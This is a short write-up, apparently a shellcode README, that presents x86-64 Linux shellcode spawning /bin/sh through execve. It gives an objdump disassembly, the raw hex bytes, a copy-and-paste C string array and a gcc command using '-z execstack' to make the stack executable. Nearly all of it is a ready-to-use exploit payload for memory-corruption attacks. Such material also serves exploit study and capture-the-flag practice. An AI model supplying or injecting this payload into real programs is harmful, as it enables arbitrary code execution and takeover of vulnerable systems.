# objdump of the text section

shellcode:     file format elf64-x86-64  


Disassembly of section .text:  
```
0000000000401000 <_start>:  
  401000:	6a 3b                	push   $0x3b  
  401002:	58                   	pop    %rax  
  401003:	48 31 d2             	xor    %rdx,%rdx  
  401006:	48 bb 2f 2f 62 69 6e 	movabs $0x68732f6e69622f2f,%rbx  
  40100d:	2f 73 68   
  401010:	48 c1 eb 08          	shr    $0x8,%rbx  
  401014:	53                   	push   %rbx  
  401015:	54                   	push   %rsp  
  401016:	5f                   	pop    %rdi  
  401017:	52                   	push   %rdx  
  401018:	57                   	push   %rdi  
  401019:	54                   	push   %rsp  
  40101a:	5e                   	pop    %rsi  
  40101b:	0f 05                	syscall   
  40101d:	6a 3c                	push   $0x3c  
  40101f:	58                   	pop    %rax  
  401020:	48 31 ff             	xor    %rdi,%rdi  
  401023:	0f 05                	syscall   
```
# ShellCode in hexa

6a 3b 58 48 31 d2 48 bb
2f 2f 62 69 6e 2f 73 68
48 c1 eb 08 53 54 5f 52
57 54 5e 0f 05 6a 3c 58
48 31 ff 0f 05 

# Easy copy/paste to use in C
```
"\x6A\x3B\x58\x48\x31\xD2\x48"
"\xBB\x2F\x2F\x62\x69\x6E\x2F"
"\x73\x68\x48\xC1\xEB\x08\x53"
"\x54\x5F\x52\x57\x54\x5E\x0F"
"\x05\x6A\x3C\x58\x48\x31\xFF\x0F\x05"
```
to compile : `gcc -z execstack exec.c`
> -z execstack allowing to execute instructions stored in the stack
